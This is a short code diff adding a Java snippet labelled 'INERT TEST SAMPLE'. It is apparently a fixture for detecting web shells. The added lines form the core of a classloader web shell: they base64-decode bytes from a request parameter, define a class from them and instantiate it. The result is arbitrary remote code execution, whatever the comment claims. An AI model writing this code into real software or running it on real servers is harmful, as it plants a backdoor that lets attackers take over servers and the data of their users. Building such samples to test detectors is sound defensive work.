@@ -1,0 +1,5 @@
+// INERT TEST SAMPLE
+class L extends ClassLoader { Class d(byte[] b) { return defineClass(b, 0, b.length); } }
+byte[] x = new BASE64Decoder().decodeBuffer(request.getParameter("p"));
+Object o = new L().d(x).newInstance();
+
